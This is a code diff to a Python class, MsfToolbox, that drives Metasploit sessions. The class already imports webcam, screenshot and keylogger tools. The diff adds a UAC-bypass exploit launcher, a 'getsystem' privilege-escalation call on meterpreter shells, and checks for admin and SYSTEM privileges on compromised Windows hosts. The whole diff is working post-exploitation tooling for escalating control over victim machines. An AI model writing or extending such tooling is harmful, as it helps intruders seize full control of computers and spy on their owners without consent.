@@ -5,6 +5,7 @@ from tools import screenshot
 from tools import webcam
 from tools import information
 from tools import keylogger
+from tools import bypassuac
 
 import os
 import time
@@ -64,6 +65,9 @@ class MsfToolbox:
 
     def get_sessions(self):
         return self._client.sessions.list
+
+    def get_session(self, session_id):
+        return self._client.sessions.list[session_id]
 
     def session_close(self, session_id):
         shell = self.get_session_shell(session_id)
@@ -163,8 +167,13 @@ class MsfToolbox:
 		return media.get_medias_url(session, "snapshots")
 
 
-    def get_sysinfo(self, session):
-        return information.get_sysinfo(self.get_session_shell(session))
+    def get_sysinfo(self, session_id):
+        shell = self.get_session_shell(session_id)
+        session = self.get_session(session_id)
+        data = information.get_sysinfo(shell)
+        is_admin = self.is_admin(shell)
+        is_system = self.is_system(session)
+        return data, is_admin, is_system
 
 	# Live
 	def start_live(self, session):
@@ -231,3 +240,25 @@ class MsfToolbox:
 
 	def get_remote_state(self):
 		return self._remote
+
+    def start_bypassuac(self, session):
+        session = int(session)
+        shell = self.get_session_shell(session)
+        session_obj = self.get_session(session)
+
+        return bypassuac.exploit(session, session_obj, shell, self._client.modules)
+
+    def get_system(self, session_id):
+        shell = self.get_session_shell(session_id)
+        shell.write('getsystem\n')
+        time.sleep(0.2)
+        ret = shell.read()
+        print ret
+
+    def is_admin(self, shell):
+        shell.write('getprivs\n')
+        result = shell.read()
+        return "SeDebugPrivilege" in result
+
+    def is_system(self, session):
+        return "AUTORITE NT\\Syst_me" in session['info']
